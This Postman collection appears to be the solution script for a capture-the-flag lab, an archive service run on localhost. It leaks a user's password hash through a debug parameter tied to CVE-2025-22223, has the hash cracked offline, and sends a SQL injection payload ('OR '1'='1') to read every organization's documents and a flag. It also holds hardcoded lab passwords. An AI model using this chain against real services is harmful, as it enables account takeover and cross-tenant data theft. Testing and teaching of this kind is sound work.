{
  "info": {
    "name": "OrgArchive — signup to cross-organization document access",
    "description": "Run in order. After request 8, recover Bob’s password offline from bobHash and set bobPassword locally.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "variable": [
    {
      "key": "gatewayUrl",
      "value": "http://localhost:8080"
    },
    {
      "key": "visitorUsername",
      "value": ""
    },
    {
      "key": "visitorPassword",
      "value": ""
    },
    {
      "key": "visitorOrganization",
      "value": ""
    },
    {
      "key": "bobHash",
      "value": ""
    },
    {
      "key": "bobPassword",
      "value": ""
    }
  ],
  "item": [
    {
      "name": "1 · Discover OrgArchive API",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/",
        "description": "",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const api = pm.response.json();",
              "pm.expect(api.service).to.equal('OrgArchive');",
              "['/signup','/users','/notes','/organizations/{organization}/notes','/documents/search'].forEach(path => pm.expect(api.endpoints.some(e => e.path === path)).to.be.true);"
            ]
          }
        }
      ]
    },
    {
      "name": "2 · Anonymous users → 401",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users",
        "description": "",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(401);"
            ]
          }
        }
      ]
    },
    {
      "name": "3 · Anonymous notes → 401",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(401);"
            ]
          }
        }
      ]
    },
    {
      "name": "4 · Sign up for a new organization",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/signup",
        "description": "",
        "auth": {
          "type": "noauth"
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"username\": \"{{visitorUsername}}\",\n  \"displayName\": \"Demo Visitor\",\n  \"email\": \"{{visitorUsername}}@example.test\",\n  \"password\": \"{{visitorPassword}}\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "prerequest",
          "script": {
            "type": "text/javascript",
            "exec": [
              "const suffix = Math.random().toString(36).slice(2, 10);",
              "pm.collectionVariables.set('visitorUsername', 'visitor-' + suffix);",
              "pm.collectionVariables.set('visitorPassword', 'VisitorPass!' + suffix + '9');"
            ]
          }
        },
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(201);",
              "const account = pm.response.json();",
              "pm.expect(account.username).to.equal(pm.collectionVariables.get('visitorUsername'));",
              "pm.expect(account.organization).to.match(/^trial-/);",
              "pm.collectionVariables.set('visitorOrganization', account.organization);"
            ]
          }
        }
      ]
    },
    {
      "name": "5 · Own organization notes → empty",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/organizations/{{visitorOrganization}}/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{visitorUsername}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{visitorPassword}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
            ]
          }
        }
      ]
    },
    {
      "name": "6 · Other organization notes → 403",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/organizations/atlas-consulting/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{visitorUsername}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{visitorPassword}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(403);"
            ]
          }
        }
      ]
    },
    {
      "name": "7 · Regular roster response → no hashes",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users",
        "description": "CVE-2025-22223: the inherited admin role annotation is missed for this regular account.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{visitorUsername}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{visitorPassword}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json().some(u => u.username === 'bob')).to.be.true;",
              "pm.expect(pm.response.text()).not.to.include('passwordHash');"
            ]
          }
        }
      ]
    },
    {
      "name": "8 · Admin debug roster → Bob hash",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users?debug=true",
        "description": "Copy bobHash into solve/crack_bob.py, then set bobPassword locally. The attacker remains a normal user.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{visitorUsername}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{visitorPassword}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const bob = pm.response.json().find(u => u.username === 'bob');",
              "pm.expect(bob.passwordHash).to.match(/^\\$2[aby]\\$/);",
              "pm.collectionVariables.set('bobHash', bob.passwordHash);"
            ]
          }
        }
      ]
    },
    {
      "name": "9 · Direct admin user lookup → 403",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/users/bob",
        "description": "A directly annotated admin method remains protected; the visitor did not gain an admin role.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{visitorUsername}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{visitorPassword}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(403);"
            ]
          }
        }
      ]
    },
    {
      "name": "10 · Bob sees Atlas notes",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const notes = pm.response.json();",
              "pm.expect(notes.some(n => n.title === 'Report index')).to.be.true;",
              "pm.collectionVariables.set('atlasNotes', JSON.stringify(notes));"
            ]
          }
        }
      ]
    },
    {
      "name": "11 · Maija sees same notes",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "m.lehtinen",
              "type": "string"
            },
            {
              "key": "password",
              "value": "d5jW#9pqL!2zX",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(JSON.stringify(pm.response.json())).to.equal(pm.collectionVariables.get('atlasNotes'));"
            ]
          }
        }
      ]
    },
    {
      "name": "12 · Harbor user sees different notes",
      "request": {
        "method": "GET",
        "url": "{{gatewayUrl}}/notes",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "r.dubois",
              "type": "string"
            },
            {
              "key": "password",
              "value": "Tr0ub4dor&3xZ!",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json().some(n => n.title === 'Fuel review')).to.be.true;",
              "pm.expect(pm.response.json().some(n => n.title === 'Report index')).to.be.false;"
            ]
          }
        }
      ]
    },
    {
      "name": "13 · Normal Atlas document search",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"query\": \"report\",\n  \"organization\": \"atlas-consulting\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const docs = pm.response.json();",
              "pm.expect(docs.length).to.be.above(0);",
              "pm.expect(docs.every(d => JSON.parse(d.metadata).organization === 'atlas-consulting')).to.be.true;"
            ]
          }
        }
      ]
    },
    {
      "name": "14 · Foreign organization search → empty",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"query\": \"report\",\n  \"organization\": \"harbor-delivery\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
            ]
          }
        }
      ]
    },
    {
      "name": "15 · SQL injection → all organizations",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"query\": \"report\",\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const organizations = new Set(pm.response.json().map(d => JSON.parse(d.metadata).organization));",
              "['atlas-consulting','harbor-delivery','cedar-partners','siteworks-group','meridian-legal'].forEach(o => pm.expect(organizations.has(o)).to.be.true);",
              "pm.expect(pm.response.text()).to.include('FLAG{archive-isolation-broken-by-converter}');"
            ]
          }
        }
      ]
    },
    {
      "name": "16 · Safe query → empty",
      "request": {
        "method": "POST",
        "url": "{{gatewayUrl}}/documents/search-safe",
        "description": "",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "bob",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{bobPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"query\": \"report\",\n  \"organization\": \"atlas-consulting' OR '1'='1\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
            ]
          }
        }
      ]
    }
  ]
}
